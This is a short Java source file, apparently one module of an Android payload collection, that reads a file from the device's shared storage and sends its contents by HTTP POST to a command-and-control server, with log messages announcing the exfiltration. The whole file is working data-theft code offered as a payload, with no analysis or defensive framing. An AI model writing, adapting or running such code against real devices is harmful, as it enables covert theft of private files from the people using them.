package payloads_source;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;

public class Payload_FileExfil {
    public void execute() {
        String filepath = "/sdcard/DCIM/sensitive.txt";  // example path
        String serverUrl = "http://10.0.2.2:5000/exfil";  // change as needed
        StringBuilder contents = new StringBuilder();

        try {
            File target = new File(filepath);
            if (!target.exists()) {
                System.out.println("[Payload] File not found: " + filepath);
                return;
            }

            BufferedReader reader = new BufferedReader(new FileReader(target));
            String line;
            while ((line = reader.readLine()) != null) {
                contents.append(line).append("\n");
            }
            reader.close();

            // POST contents to C2
            HttpURLConnection conn = (HttpURLConnection) new URL(serverUrl).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "text/plain");

            OutputStream os = conn.getOutputStream();
            OutputStreamWriter writer = new OutputStreamWriter(os, "UTF-8");
            writer.write(contents.toString());
            writer.flush();
            writer.close();
            os.close();

            conn.getResponseCode(); // Force the send
            System.out.println("[Payload] File exfiltrated to C2.");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
